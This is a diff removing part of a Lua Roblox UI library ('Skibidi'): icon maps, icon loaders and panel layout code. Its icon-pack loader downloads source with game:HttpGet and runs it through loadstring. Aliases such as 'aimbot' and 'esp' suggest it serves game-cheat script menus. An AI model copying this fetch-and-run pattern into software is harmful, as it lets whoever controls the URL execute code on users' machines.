-		["gift"] = "109855212076373", ["coins"] = "116510979641930", ["dollar-sign"] = "127320961224019",
-		["wallet"] = "132331555762628", ["credit-card"] = "99163352872346", ["shopping-cart"] = "128420521375441",
-		["shopping-bag"] = "71885477293226", ["tag"] = "129104970103940", ["tags"] = "107179263080798",
-		["bookmark"] = "121093149326239", ["flag"] = "78183383236196", ["clock"] = "121808839832144",
-		["timer"] = "85473888890506", ["timer-reset"] = "110052125369932", ["hourglass"] = "86160434939203",
-		["calendar"] = "114792700814035", ["calendar-days"] = "99072017568595",
-		["alarm-clock"] = "126259032907535", ["watch"] = "130544621618405", ["activity"] = "94212016861936",
-		["chart-bar"] = "105389816384108", ["chart-line"] = "101833156055618", ["chart-pie"] = "113412261630136",
-		["trending-up"] = "81819858538839", ["trending-down"] = "139309232226438", ["gauge"] = "110273524101447",
-		["power"] = "96479131758775", ["power-off"] = "118768311012214", ["log-in"] = "103768533135201",
-		["log-out"] = "84895399304975", ["rocket"] = "87412317685854", ["ghost"] = "113822048130017",
-		["skull"] = "137726256442333", ["bot"] = "80451686744860", ["brain"] = "92424107303177",
-		["message-square"] = "83881670383280", ["message-circle"] = "127255077587058",
-		["messages-square"] = "97532166733358", ["send"] = "127751956873796", ["mail"] = "103945161245599",
-		["phone"] = "128804946640049", ["camera"] = "79950339943067", ["image"] = "112751259236831",
-		["images"] = "79350649395557", ["video"] = "107587444636945", ["film"] = "120978945609706",
-		["music"] = "113343203848535", ["volume"] = "103236289817396", ["volume-1"] = "98514588731639",
-		["volume-2"] = "89344380902620", ["volume-x"] = "139252359189540", ["mic"] = "89640799126523",
-		["mic-off"] = "82123034444822", ["monitor"] = "72664649203050", ["smartphone"] = "96623008834511",
-		["tv"] = "135687724791776", ["keyboard"] = "121474456068237", ["mouse"] = "73096068864710",
-		["mouse-pointer"] = "72322454962935", ["palette"] = "86350350950064", ["paintbrush"] = "125572663700289",
-		["brush"] = "127035535799640", ["droplet"] = "100597455015098", ["droplets"] = "140111846025180",
-		["pipette"] = "133167932934404", ["scaling"] = "122360365318466", ["maximize"] = "76045941763188",
-		["maximize-2"] = "73085922906397", ["minimize"] = "121304296213645", ["minimize-2"] = "116269596042539",
-		["expand"] = "137492887754537", ["shrink"] = "90953687918880", ["fullscreen"] = "77793665526178",
-		["funnel"] = "108829540827529", ["toggle-left"] = "85887872573050", ["toggle-right"] = "90411952142550",
-		["circle"] = "130359823580534", ["circle-dot"] = "82947033619201", ["dot"] = "137321056643916",
-		["grip"] = "109058783556768", ["grip-vertical"] = "137183678565296",
-		["grip-horizontal"] = "136255899715930", ["ellipsis"] = "140019550645825",
-		["ellipsis-vertical"] = "117978708573781", ["lightbulb"] = "103871245626488", ["book"] = "125383279695672",
-		["book-open"] = "129845326810392", ["scroll"] = "74072101474951", ["history"] = "123980022019922",
-		["undo"] = "111258459077271", ["redo"] = "116150342119054", ["undo-2"] = "113885292059932",
-		["redo-2"] = "70451039017914", ["car"] = "121065933462582", ["car-front"] = "87380942739063",
-		["plane"] = "126985561580989", ["footprints"] = "139192589041315", ["person-standing"] = "125020872044147",
-		["bike"] = "102930322246035", ["ship"] = "83995100553930", ["anchor"] = "92181172123618",
-		["trophy"] = "131545003268773", ["crown"] = "127843403295538", ["medal"] = "79016002264450",
-		["award"] = "132740088158419", ["gem"] = "112904952151156", ["diamond"] = "105846996304890",
-		["dice-5"] = "72768312430593", ["puzzle"] = "136837798892463", ["infinity"] = "98083086936965",
-		["percent"] = "130155041032013", ["hash"] = "82890331678520", ["at-sign"] = "79059152889146",
-		["type"] = "133543553793564", ["bold"] = "116141470019166", ["italic"] = "96220378864282",
-		["languages"] = "90816903776498", ["radio"] = "85611589536956", ["rss"] = "131789058984793",
-		["share"] = "87340985053299", ["share-2"] = "71210767962065", ["github"] = "120349554354380",
-		["youtube"] = "123663668456341", ["twitch"] = "71383308134888", ["twitter"] = "88791703276842",
-		["instagram"] = "119864798614855", ["facebook"] = "72098528632192", ["cat"] = "124252153404931",
-		["dog"] = "71920105558570", ["bird"] = "132284145117371", ["fish"] = "124360663785796",
-		["rabbit"] = "98580518804206", ["bone"] = "111242153474115", ["leaf"] = "119951075637174",
-		["trees"] = "121203841375919", ["tree-pine"] = "124662547202594", ["mountain"] = "73269957566415",
-		["waves"] = "96340135183647", ["wind"] = "114551690399915", ["umbrella"] = "127502210274589",
-		["thermometer"] = "106546011492311", ["battery"] = "70765800346189",
-		["battery-charging"] = "80139357470047", ["battery-low"] = "139659256984314", ["plug"] = "99782373064495",
-		["plug-zap"] = "74506269884055", ["bluetooth"] = "90506573139443", ["signal"] = "78424889355261",
-		["radar"] = "138528222906635", ["satellite"] = "134967053164645", ["scan"] = "123104789658180",
-		["qr-code"] = "105329945723350", ["fingerprint"] = "112173305232811", ["id-card"] = "75354294622640",
-		["contact"] = "75868297719012", ["handshake"] = "78442115255814", ["thumbs-up"] = "111137070767020",
-		["thumbs-down"] = "87794009914015", ["smile"] = "105880397565283", ["frown"] = "124407301067982",
-		["meh"] = "132197867028557", ["laugh"] = "104491311361166", ["angry"] = "74237056000103",
-		["party-popper"] = "111626795712193", ["cake"] = "103131590503275", ["pizza"] = "126964453193501",
-		["coffee"] = "106864403231093", ["beer"] = "116404978807744", ["utensils"] = "139952569804235",
-		["apple"] = "104349242902442", ["pill"] = "73280534813448", ["syringe"] = "123891270479254",
-		["bandage"] = "129660129590770", ["cross"] = "101833377863588", ["biohazard"] = "95956532900432",
-		["radiation"] = "104499586848433", ["bomb"] = "139223800924636", ["axe"] = "132405197863294",
-		["pickaxe"] = "105888023317688", ["shovel"] = "102465000512056", ["magnet"] = "135162361226972",
-		["highlighter"] = "77411555641113", ["ruler"] = "81432445547423", ["paint-bucket"] = "124275586663284",
-		["shapes"] = "129989433311409", ["triangle"] = "126330486745540", ["hexagon"] = "127592089339199",
-		["pentagon"] = "79184802179890", ["octagon"] = "120803515514852", ["component"] = "110027788875080",
-		["blocks"] = "72212693357737", ["door-open"] = "91306356501736", ["door-closed"] = "136249099949073",
-		["bed"] = "97726529032925", ["lamp"] = "110730830653382", ["speaker"] = "96227183003618",
-		["headphones"] = "118833729589183", ["clapperboard"] = "132660667070200", ["airplay"] = "115020759309179",
-		["cast"] = "98202245922071", ["printer"] = "76080649734247", ["usb"] = "117230058949613",
-		["binary"] = "91751953950088", ["braces"] = "117761094704041", ["brackets"] = "74368995728099",
-		["regex"] = "100727200791841", ["variable"] = "104743088438151", ["sigma"] = "126884244870899",
-		["pi"] = "74936036243146", ["calculator"] = "74915716529646", ["table"] = "109109148250737",
-		["kanban"] = "125934100055431", ["workflow"] = "99186544029189", ["git-branch"] = "90490195516649",
-		["git-merge"] = "131833355158059", ["git-pull-request"] = "138463010991471",
-		["network"] = "127410729922644", ["route"] = "89968303228953", ["waypoints"] = "102450133666017",
-		["milestone"] = "101618292325920", ["inbox"] = "112591360302868", ["archive"] = "122180020814574",
-		["truck"] = "86662707764771", ["bus"] = "133798469717463", ["fuel"] = "106447647274511",
-		["construction"] = "106539489968173", ["traffic-cone"] = "74110220470369", ["siren"] = "134210267818039",
-		["loader"] = "78408734580845", ["loader-circle"] = "116535712789945", ["wallet-cards"] = "129728715308337",
-		["gavel"] = "78952298198456", ["scale"] = "108203682317477", ["text-cursor"] = "115984654447300",
-		["text-cursor-input"] = "107551944047171", ["tally-5"] = "88031817475886",
-		["badge-percent"] = "121359224294885", ["sunrise"] = "134705665494098", ["sunset"] = "75904872203588",
-		["cloud-rain"] = "105547081967408", ["cloud-snow"] = "72307126270226",
-		["cloud-lightning"] = "133517088924849", ["cloud-sun"] = "86114208148727",
-		["cloud-moon"] = "71938114737914", ["zoom-in"] = "127956924984803", ["zoom-out"] = "108334162607319",
-		["focus"] = "87493973153317", ["aperture"] = "83396154449972", ["camera-off"] = "81057636835256",
-		["image-plus"] = "70391970623917", ["image-off"] = "81934811700938", ["file-plus"] = "78881710800060",
-		["file-minus"] = "111014798459222", ["file-check"] = "82604001452455", ["file-x"] = "107333775515154",
-		["file-search"] = "97780235974933", ["file-lock"] = "72170228691242", ["file-cog"] = "101385347151368",
-		["folder-plus"] = "91865663406119", ["folder-minus"] = "85648718999010",
-		["folder-lock"] = "119201572260567", ["folder-cog"] = "85299519462846", ["folder-tree"] = "85577554337861",
-		["folders"] = "110351216219061", ["import"] = "116545008906029", ["step-back"] = "108672750005121",
-		["step-forward"] = "126131872136145", ["disc"] = "101908120120777", ["podcast"] = "109577075549215",
-		["antenna"] = "99628923540956", ["square-plus"] = "114713264461873", ["square-minus"] = "116764432015770",
-		["square-play"] = "108186325238481", ["square-pause"] = "86608552787615",
-		["square-stop"] = "80018708472943", ["octagon-x"] = "90498161006311", ["check-check"] = "95183312173858",
-	},
-}
--- Names lucide has renamed over the years (WindUI scripts still use the
--- old ones), plus a few plain-English spellings.
-local ICON_ALIASES = {
-	["aimbot"] = "crosshair", ["alert"] = "circle-alert", ["alert-circle"] = "circle-alert",
-	["alert-octagon"] = "octagon-alert", ["alert-triangle"] = "triangle-alert",
-	["badge-help"] = "badge-question-mark", ["bar-chart"] = "chart-bar", ["bin"] = "trash-2",
-	["bulb"] = "lightbulb", ["check-circle"] = "circle-check", ["check-square"] = "square-check",
-	["circle-help"] = "circle-question-mark", ["close"] = "x", ["cogwheel"] = "settings", ["color"] = "palette",
-	["colour"] = "palette", ["combat"] = "swords", ["config"] = "save", ["configs"] = "save",
-	["credits"] = "info", ["crosshairs"] = "crosshair", ["discord"] = "message-circle",
-	["download-cloud"] = "cloud-download", ["edit"] = "pencil", ["edit-2"] = "pen", ["edit-3"] = "pen-line",
-	["enter"] = "log-in", ["error"] = "circle-x", ["esp"] = "eye", ["exit"] = "log-out", ["filter"] = "funnel",
-	["fire"] = "flame", ["fly"] = "plane", ["function-square"] = "square-function", ["gauge-circle"] = "gauge",
-	["gear"] = "settings", ["git-commit"] = "git-commit-horizontal", ["globe-2"] = "earth",
-	["grid"] = "grid-3x3", ["help"] = "circle-question-mark", ["help-circle"] = "circle-question-mark",
-	["home"] = "house", ["lightning"] = "zap", ["line-chart"] = "chart-line", ["loader-2"] = "loader-circle",
-	["location"] = "map-pin", ["magnifier"] = "search", ["minus-circle"] = "circle-minus",
-	["minus-square"] = "square-minus", ["misc"] = "layout-grid", ["more-horizontal"] = "ellipsis",
-	["more-vertical"] = "ellipsis-vertical", ["mute"] = "volume-x", ["paint"] = "palette",
-	["pause-circle"] = "circle-pause", ["people"] = "users", ["person"] = "user", ["photo"] = "image",
-	["picture"] = "image", ["pie-chart"] = "chart-pie", ["play-circle"] = "circle-play", ["player"] = "user",
-	["plus-circle"] = "circle-plus", ["plus-square"] = "square-plus", ["question"] = "circle-question-mark",
-	["refresh"] = "refresh-cw", ["reload"] = "rotate-cw", ["remove"] = "trash-2",
-	["shield-question"] = "shield-question-mark", ["sliders"] = "sliders-horizontal", ["sound"] = "volume-2",
-	["speed"] = "gauge", ["stop-circle"] = "circle-stop", ["success"] = "circle-check",
-	["teleport"] = "map-pinned", ["text"] = "type", ["tick"] = "check", ["tool"] = "wrench",
-	["unlock"] = "lock-open", ["upload-cloud"] = "cloud-upload", ["user-2"] = "user-round",
-	["users-2"] = "users-round", ["visuals"] = "eye", ["wand-2"] = "wand-sparkles",
-	["warning"] = "triangle-alert", ["world"] = "globe", ["x-circle"] = "circle-x", ["x-square"] = "square-x",
-}
-
-local iconPackState   = {}   -- pack -> "loading" | "loaded" | "failed"
-local iconPackWaiters = {}   -- pack -> { fn(ok), ... }
-local iconWarned      = {}   -- spec -> true once an "unknown icon" warning fired
-Skibidi.Icons = IconPacks
-
-local function httpGet(url)
-	local ok, res = pcall(function() return game:HttpGet(url) end)
-	if ok and type(res) == "string" and #res > 0 then return res end
-	ok, res = pcall(function() return HttpService:GetAsync(url) end)
-	if ok and type(res) == "string" and #res > 0 then return res end
-	return nil
-end
-
-local function isRawAsset(spec)
-	return type(spec) == "string"
-	   and (string.find(spec, "^rbxasset") or string.find(spec, "^http") or string.match(spec, "^%d+$")) ~= nil
-end
-
-local function parseIconSpec(spec)
-	local pack, name = string.match(spec, "^([%w_%-]+):(.+)$")
-	if pack and (ICON_PACK_URLS[pack] or IconPacks[pack]) then
-		return pack, name
-	end
-	return DEFAULT_ICON_PACK, spec
-end
-
-local function lookupIcon(pack, name)
-	local set = IconPacks[pack]
-	if not set then return nil end
-	name = string.lower(name)
-	local id = set[name] or (ICON_ALIASES[name] and set[ICON_ALIASES[name]])
-	if id == nil then return nil end
-	if type(id) == "number" then id = tostring(id) end
-	if not string.find(id, "://") then id = "rbxassetid://" .. id end
-	return id
-end
-
--- Synchronous lookup. nil means "not known *yet*" for a lucide name that
--- is outside the embedded subset and hasn't been downloaded.
-function Skibidi.ResolveIcon(spec)
-	if spec == nil or spec == "" then return nil end
-	if type(spec) == "number" then return "rbxassetid://" .. tostring(spec) end
-	if type(spec) ~= "string" then return nil end
-	if string.match(spec, "^%d+$") then return "rbxassetid://" .. spec end
-	if isRawAsset(spec) then return spec end
-	return lookupIcon(parseIconSpec(spec))
-end
-
-local function loadIconPack(pack, onDone)
-	local state = iconPackState[pack]
-	if state == "loaded" or state == "failed" then
-		if onDone then task.spawn(onDone, state == "loaded") end
-		return
-	end
-	if onDone then
-		iconPackWaiters[pack] = iconPackWaiters[pack] or {}
-		table.insert(iconPackWaiters[pack], onDone)
-	end
-	if state == "loading" then return end
-	iconPackState[pack] = "loading"
-	task.spawn(function()
-		local ok  = false
-		local url = ICON_PACK_URLS[pack]
-		local src = url and httpGet(url)
-		if src then
-			local okc, chunk = pcall(loadstring, src)
-			local okr, data  = false, nil
-			if okc and type(chunk) == "function" then okr, data = pcall(chunk) end
-			if okr and type(data) == "table" then
-				local set = IconPacks[pack] or {}
-				for k, v in pairs(data) do
-					if type(k) == "string" and set[k] == nil then
-						if type(v) == "number" then v = tostring(v) end
-						if type(v) == "table" and v.Image then v = v.Image end
-						if type(v) == "string" then set[k] = v end
-					end
-				end
-				IconPacks[pack] = set
-				ok = true
-			end
-		end
-		iconPackState[pack] = ok and "loaded" or "failed"
-		if not ok then
-			warn(("[Skibidi] icon pack %q could not be downloaded; only the embedded icons are available"):format(pack))
-		end
-		local waiters = iconPackWaiters[pack]
-		iconPackWaiters[pack] = nil
-		for _, fn in ipairs(waiters or {}) do task.spawn(fn, ok) end
-	end)
-end
-
--- Downloads the full map now (e.g. at script start) so no icon ever
--- shows up a beat late. `cb(ok)` is optional.
-function Skibidi.PreloadIcons(pack, cb)
-	if type(pack) == "function" then pack, cb = nil, pack end
-	loadIconPack(pack or DEFAULT_ICON_PACK, cb)
-end
-
--- Register custom names, WindUI AddIcons style: { name = id, ... }.
--- The id may be a number, "rbxassetid://…", or a WindUI spritesheet
--- entry (only its Image is used).
-function Skibidi.AddIcons(pack, tbl)
-	if type(pack) == "table" and tbl == nil then pack, tbl = DEFAULT_ICON_PACK, pack end
-	if type(tbl) ~= "table" then return end
-	IconPacks[pack] = IconPacks[pack] or {}
-	for k, v in pairs(tbl) do
-		if type(v) == "number" then v = tostring(v) end
-		if type(v) == "table" and v.Image then v = v.Image end
-		if type(k) == "string" and type(v) == "string" then
-			IconPacks[pack][string.lower(k)] = v
-		end
-	end
-end
-
--- Points an ImageLabel at an icon spec. Unknown lucide names trigger a
--- download of the full map and the label is filled in once it lands
--- (unless it was re-pointed somewhere else in the meantime).
-local function SetIconImage(label, spec)
-	if not label then return false end
-	local key = (spec ~= nil and spec ~= "") and tostring(spec) or nil
-	label:SetAttribute("IconSpec", key)
-	local id = Skibidi.ResolveIcon(spec)
-	if id then
-		label.Image = id
-		return true
-	end
-	label.Image = ""
-	if type(spec) ~= "string" or spec == "" then return false end
-	local pack = parseIconSpec(spec)
-	local function unknown()
-		if not iconWarned[spec] then
-			iconWarned[spec] = true
-			warn(("[Skibidi] unknown icon %q"):format(spec))
-		end
-	end
-	if iconPackState[pack] == "loaded" or iconPackState[pack] == "failed" then
-		if iconPackState[pack] == "loaded" then unknown() end
-		return false
-	end
-	loadIconPack(pack, function(ok)
-		if label:GetAttribute("IconSpec") ~= key then return end
-		local late = Skibidi.ResolveIcon(spec)
-		if late then
-			label.Image = late
-		elseif ok then
-			unknown()
-		end
-	end)
-	return false
-end
-Skibidi.SetIcon = SetIconImage
-
-local function MakeIcon(parent, spec, size, color, zindex)
-	local L = Instance.new("ImageLabel")
-	L.Name                   = "SkibidiIcon"
-	L.Size                   = UDim2.new(0, size or 14, 0, size or 14)
-	L.BackgroundTransparency = 1
-	L.BorderSizePixel        = 0
-	L.ImageColor3            = color or Theme.TextPrimary
-	L.ScaleType              = Enum.ScaleType.Fit
-	L.ZIndex                 = zindex or (parent and parent.ZIndex) or 1
-	SetIconImage(L, spec)
-	L.Parent                 = parent
-	return L
-end
-
--- Standalone icon for callers building their own layouts.
-function Skibidi.CreateIcon(Parent, spec, size, color)
-	if type(spec) == "table" then
-		local o = spec
-		spec, size, color = o.Icon, o.Size or size, o.Color or color
-	end
-	local L = MakeIcon(Parent, spec, size or 16, color)
-	return {
-		Frame = L,
-		Label = L,
-		Set   = function(sp) return SetIconImage(L, sp) end,
-	}
-end
-
--- ── Layout helpers ─────────────────────────────────────────
--- Three ways to put an icon next to text, depending on how the text
--- is laid out. Each returns the ImageLabel.
-
--- Left-aligned label positioned by offset inside a row: the icon takes
--- the label's slot and the label slides right by (size + gap).
-local function PrefixIcon(Lbl, spec, size, color, gap)
-	size = size or 14
-	gap  = gap  or 6
-	local shift = size + gap
-	local L = MakeIcon(Lbl.Parent, spec, size, color or Lbl.TextColor3, Lbl.ZIndex)
-	local px, py, sy = Lbl.Position.X, Lbl.Position.Y, Lbl.Size.Y
-	L.AnchorPoint = Vector2.new(0, 0.5)
-	L.Position    = UDim2.new(px.Scale, px.Offset,
-	                          py.Scale + sy.Scale / 2, py.Offset + sy.Offset / 2)
-	Lbl.Position  = Lbl.Position + UDim2.new(0, shift, 0, 0)
-	Lbl.Size      = Lbl.Size     - UDim2.new(0, shift, 0, 0)
-	return L
-end
-
--- Left-aligned text on an object that carries (or can carry) a
--- UIPadding: the padding grows and the icon sits inside it.
-local function PadIcon(obj, spec, size, color, gap)
-	size = size or 14
-	gap  = gap  or 6
-	local pad = obj:FindFirstChildOfClass("UIPadding")
-	if not pad then
-		pad = Instance.new("UIPadding")
-		pad.Parent = obj
-	end
-	pad.PaddingLeft = UDim.new(pad.PaddingLeft.Scale, pad.PaddingLeft.Offset + size + gap)
-	local L = MakeIcon(obj, spec, size, color or obj.TextColor3, obj.ZIndex)
-	L.AnchorPoint = Vector2.new(0, 0.5)
-	L.Position    = UDim2.new(0, -(size + gap), 0.5, 0)
-	return L
-end
-
--- Centred text (buttons, top tabs): the icon rides just left of the
--- rendered text and the pair stays centred as a block. The text is
--- measured again whenever Text/Font/TextSize change, so confirm-mode
--- relabels and active-tab font swaps keep the icon glued to the text.
-local function InlineIcon(btn, spec, size, color, gap)
-	size = size or 14
-	gap  = gap  or 6
-	local block = size + gap
-	local pad = btn:FindFirstChildOfClass("UIPadding")
-	if not pad then
-		pad = Instance.new("UIPadding")
-		pad.Parent = btn
-	end
-	pad.PaddingLeft = UDim.new(pad.PaddingLeft.Scale, pad.PaddingLeft.Offset + block)
-	-- Full-size overlay layers (the ripple host) must keep covering the
-	-- whole control even though the padding just shrank the content box.
-	for _, c in ipairs(btn:GetChildren()) do
-		if c:IsA("GuiObject") and c.Size == UDim2.new(1, 0, 1, 0)
-		   and c.Position == UDim2.new(0, 0, 0, 0) then
-			c.Size     = UDim2.new(1, block, 1, 0)
-			c.Position = UDim2.new(0, -block, 0, 0)
-		end
-	end
-	local L = MakeIcon(btn, spec, size, color or btn.TextColor3, btn.ZIndex)
-	L.AnchorPoint = Vector2.new(0, 0.5)
-	local function relayout()
-		local t, w = btn.Text, 0
-		if t ~= "" then
-			local ok, b = pcall(TextService.GetTextSize, TextService,
-				t, btn.TextSize, btn.Font, Vector2.new(4000, 100))
-			w = (ok and b and b.X) or (#t * btn.TextSize * 0.55)
-		end
-		if w == 0 then
-			-- Icon alone: centre it in the *unpadded* box.
-			L.Position = UDim2.new(0.5, -(size + block) / 2, 0.5, 0)
-		else
-			L.Position = UDim2.new(0.5, -(w / 2 + block), 0.5, 0)
-		end
-	end
-	relayout()
-	for _, p in ipairs({ "Text", "Font", "TextSize" }) do
-		btn:GetPropertyChangedSignal(p):Connect(relayout)
-	end
-	return L
-end
-
--- ============================================================
--- CreatePanel
--- Creates a draggable panel with optional tab bar.
---
--- Options:
---   Name         string    ScreenGui name              (default "SkibidiPanel")
---   Title        string    Header title text           (default "")
---   Width        number    Width in pixels             (default 310)
---   Height       number    Content height in pixels    (default 300)
---   Icon         string    Lucide icon shown in place of the title pip
---                          (optional, see ICONS above)
---   Tabs         table     Array of tab names, or of tables
---                          { Name = "Main", Icon = "house" }
---                                                      (optional — omit for no tabs)
---   TabIcons     table     Parallel list of icon specs for string
---                          Tabs entries, e.g. { "house", "settings" }
---                          (optional)
---   DefaultTab   number    Initially active tab index  (default 1)
---   TabSide      string    "top" | "left"              (default "top")
---                          "left" renders a vertical tab rail instead
---                          of the horizontal bar under the header
---   TabWidth     number    Rail width when TabSide="left" (default 96)
---   SubTitle     string    Small muted text after the title (optional)
---   Variant      string    "gold"|"blue"|"green"|"red" (optional)
---   Minimized    bool      Start minimized             (default false)
---   ClampToScreen bool     Keep the panel inside the screen while
---                          dragging                    (default false)
---   ToggleKey    Enum.KeyCode | string   Hotkey that shows/hides the
---                          whole panel (optional)
---   Discord      bool      Discord chip in the header; click copies
---                          the invite link             (default false)
---   Search       bool      Search chip in the header (lucide "search"
---                          icon). Opens a search box in place of the
---                          title that live-filters the panel's rows
---                          by their text, across every tab
---                                                      (default true)
---   Scaler       bool      Resize grip in the bottom-right corner;
---                          drag it to resize the panel (default false)
---   MinSize      Vector2 | {w, h}   Smallest size the grip allows
---                          (default half the panel's initial size)
---   MaxSize      Vector2 | {w, h}   Largest size the grip allows
---                          (default double the panel's initial size)
---   ConfirmClose bool      Close chip asks "are you sure?" before
---                          closing                     (default true)
---   CloseTitle   string    Dialog heading   (default "Close panel?")
---   CloseMessage string    Dialog body text (optional)
---   MinWidth / MinHeight / MaxWidth / MaxHeight   number
---                          Per-axis overrides of the two above
---
--- Returns:
---   {
---     Gui, Frame, Header, TitleLabel,
---     Content,           -- Frame/ScrollingFrame for the active content area
---                        --   (if Tabs given, this is the current tab's frame)
---     GetTab(index),     -- returns the Frame for tab[index]  (nil if no tabs)
---     SetTab(index),     -- switches active tab
---     GetActiveTab(),    -- returns current tab index
---     GetTabButton(index), SetTitle(text), SetSubTitle(text),
---     SetIcon(spec), SetTabIcon(index, spec), GetTabIcon(index),
---     SetVisible(bool), ToggleVisible(), IsVisible(),
---     SetMinimized(bool), IsMinimized(), Close(), ConfirmClose(),
---     SetSearchOpen(bool), IsSearchOpen(), SetSearch(text),
---     SetSize(w, h), GetSize(),
---     SearchBtn, ScaleBtn (nil when the option is off)
---   }
--- ============================================================
-function Skibidi.CreatePanel(Options)
-	Options = Options or {}
-
-	local Width      = Options.Width  or 310
-	-- Tab entries may be plain strings or { Name = "…", Icon = "…" }
-	-- tables; Options.TabIcons is an equivalent parallel list of icon
-	-- specs for callers who'd rather keep Tabs as strings.
-	local Tabs, tabIconSpecs = nil, {}   -- nil = no tab bar
-	if type(Options.Tabs) == "table" then
-		Tabs = {}
-		for i, t in ipairs(Options.Tabs) do
-			if type(t) == "table" then
-				Tabs[i] = tostring(t.Name or t.Title or t.Text or t[1] or "")
-				tabIconSpecs[i] = t.Icon or t[2]
-			else
-				Tabs[i] = tostring(t)
-			end
-			if type(Options.TabIcons) == "table" and Options.TabIcons[i] then
-				tabIconSpecs[i] = Options.TabIcons[i]
-			end
-		end
-	end
-	local hasTabs    = Tabs and #Tabs > 0
-	local activeTab  = Options.DefaultTab or 1
-
-	-- Resolve accent
-	local Accent, AccentDim
-	if Options.Variant then
-		local V = {
-			gold  = { Color3.fromRGB(220,160, 60), Color3.fromRGB(100, 72,28) },
-			blue  = { Color3.fromRGB( 60,140,220), Color3.fromRGB( 30, 80,160) },
-			green = { Color3.fromRGB( 60,200, 90), Color3.fromRGB( 30,140, 50) },
-			red   = { Color3.fromRGB(220, 60, 60), Color3.fromRGB(160, 30, 30) },
-		}
-		local v = V[Options.Variant]
-		Accent    = v and v[1] or Theme.Accent
-		AccentDim = v and v[2] or Theme.AccentDim
-	else
-		Accent    = Theme.Accent
-		AccentDim = Theme.AccentDim
-	end
-
-	-- Layout constants. Side tabs replace the horizontal bar with a
-	-- vertical rail, so the bar contributes no height in that mode.
-	local sideTabs   = hasTabs and Options.TabSide == "left"
-	local HEADER_H   = Theme.HeaderHeight
-	local TABBAR_H   = (hasTabs and not sideTabs) and Theme.TabHeight or 0
-	local RAIL_W     = sideTabs and (Options.TabWidth or 96) or 0
-	local CONTENT_H  = Options.Height or 300
-	local FULL_H     = HEADER_H + TABBAR_H + CONTENT_H
-
-	-- ── ScreenGui ──────────────────────────────────────────
-	local Gui = Instance.new("ScreenGui")
-	Gui.Name           = Options.Name or "SkibidiPanel"
-	Gui.ResetOnSpawn   = false
-	Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-	Gui.Parent         = Options.Parent or DefaultParent
-	table.insert(_allGuis, Gui)
-
-	-- ── Main frame ─────────────────────────────────────────
-	local Frame = Instance.new("Frame")
-	Frame.Size                   = UDim2.new(0, Width, 0, FULL_H)
-	Frame.Position               = UDim2.new(0.5, -(Width/2), 0.5, -(FULL_H/2))
-	Frame.BackgroundColor3       = Theme.Bg1
-	Frame.BackgroundTransparency = 0.04
-	Frame.BorderSizePixel        = 0
-	Frame.ClipsDescendants       = true
-	Frame.Active                 = true
-	Frame.Parent                 = Gui
-	MakeCorner(Frame, UDim.new(0, Theme.CornerRadius))
-	-- Border shimmers slowly around the panel when Theme.AnimatedBorder is
-	-- on; falls back to a plain accent stroke when it isn't.
-	local FrameStroke = MakeAnimatedStroke(Frame, Accent, 1.4)
-	MakeGlass(Frame, 0.14)
-	MakeGrain(Frame)
-
-	-- Drop shadow. The panel clips its descendants, so the shadow lives
-	-- as a sibling underneath it and mirrors the panel's Position/Size
-	-- (property signals fire every frame during drags and tweens, so it
-	-- tracks minimize/restore and dragging for free).
-	-- Two shadow layers, not one. A wide, faint falloff lifts the window
-	-- off whatever is behind it; a tighter, darker one hugs the edges as a
-	-- contact shadow. A single blur can be soft or grounded, never both,
-	-- and that is exactly what makes one-layer windows look pasted on.
-	local shadowLayers = {}
-	local function makeShadowLayer(pad, alpha, drop)
-		local L = Instance.new("ImageLabel")
-		L.Name                   = "SkibidiShadow"
-		L.BackgroundTransparency = 1
-		L.Image                  = Theme.ShadowAsset
-		L.ImageColor3            = Color3.new(0, 0, 0)
-		L.ImageTransparency      = alpha
-		L.ScaleType              = Enum.ScaleType.Slice
-		L.SliceCenter            = Rect.new(49, 49, 450, 450)
-		L.ZIndex                 = 0
-		L.Parent                 = Gui
-		local sc = Instance.new("UIScale")
-		sc.Scale  = 0.92
-		sc.Parent = L
-		table.insert(shadowLayers, { Obj = L, Pad = pad, Drop = drop, Scale = sc })
-		return L
-	end
-
-	local elev = Theme.Elevation or 0.38
-	makeShadowLayer(38, math.clamp(elev + 0.26, 0, 1), 12)   -- ambient
-	local Shadow = makeShadowLayer(16, elev, 4)              -- contact
-
-	local function syncShadow()
-		local p, sz = Frame.Position, Frame.Size
-		for _, L in ipairs(shadowLayers) do
-			L.Obj.Position = UDim2.new(p.X.Scale, p.X.Offset - L.Pad,
-			                           p.Y.Scale, p.Y.Offset - L.Pad + L.Drop)
-			L.Obj.Size     = UDim2.new(sz.X.Scale, sz.X.Offset + L.Pad * 2,
-			                           sz.Y.Scale, sz.Y.Offset + L.Pad * 2)
-		end
-	end
-	Frame:GetPropertyChangedSignal("Position"):Connect(syncShadow)
-	Frame:GetPropertyChangedSignal("Size"):Connect(syncShadow)
-	Frame:GetPropertyChangedSignal("Visible"):Connect(function()
-		for _, L in ipairs(shadowLayers) do L.Obj.Visible = Frame.Visible end
-	end)
-	syncShadow()
-
-	-- Ambient accent bloom. Sits between the shadow and the panel so the
-	-- window looks lit rather than pasted onto the screen.
-	local Bloom = MakeGlow(Frame, Accent, 26, 0.86)
-	if Bloom then Bloom.ZIndex = 0 end
-
-	-- Entrance: gentle pop-in on creation (UIScale rests at 1 afterwards,
-	-- so it never affects layout or dragging). The shadow scales in with
-	-- the panel so it doesn't hang oversized around the smaller frame.
-	local OpenScale = Instance.new("UIScale")
-	OpenScale.Scale  = 0.92
-	OpenScale.Parent = Frame
-	TweenService:Create(OpenScale, TweenSpring, { Scale = 1 }):Play()
-	for _, L in ipairs(shadowLayers) do
-		TweenService:Create(L.Scale, TweenSpring, { Scale = 1 }):Play()
-	end
-
-	-- ── Title / Header bar ─────────────────────────────────
-	local Header = Instance.new("Frame")
-	Header.Size             = UDim2.new(1, 0, 0, HEADER_H)
-	Header.Position         = UDim2.new(0, 0, 0, 0)
-	Header.BackgroundColor3 = Theme.Bg0
-	Header.BorderSizePixel  = 0
-	Header.Active           = true
-	Header.Selectable       = true
-	Header.ZIndex           = 2
-	Header.Parent           = Frame
-	MakeCorner(Header, UDim.new(0, Theme.CornerRadius))
-	MakeGloss(Header, 0.14)
-
-	-- Accent wash across the header: strongest on the left behind the
-	-- title, gone by the middle, so the title sits in its own pool of
-	-- colour without tinting the buttons on the right.
-	local HeaderWash = Instance.new("Frame")
-	HeaderWash.Size                   = UDim2.new(1, 0, 1, 0)
-	HeaderWash.BackgroundColor3       = Accent
-	HeaderWash.BorderSizePixel        = 0
-	HeaderWash.ZIndex                 = 2
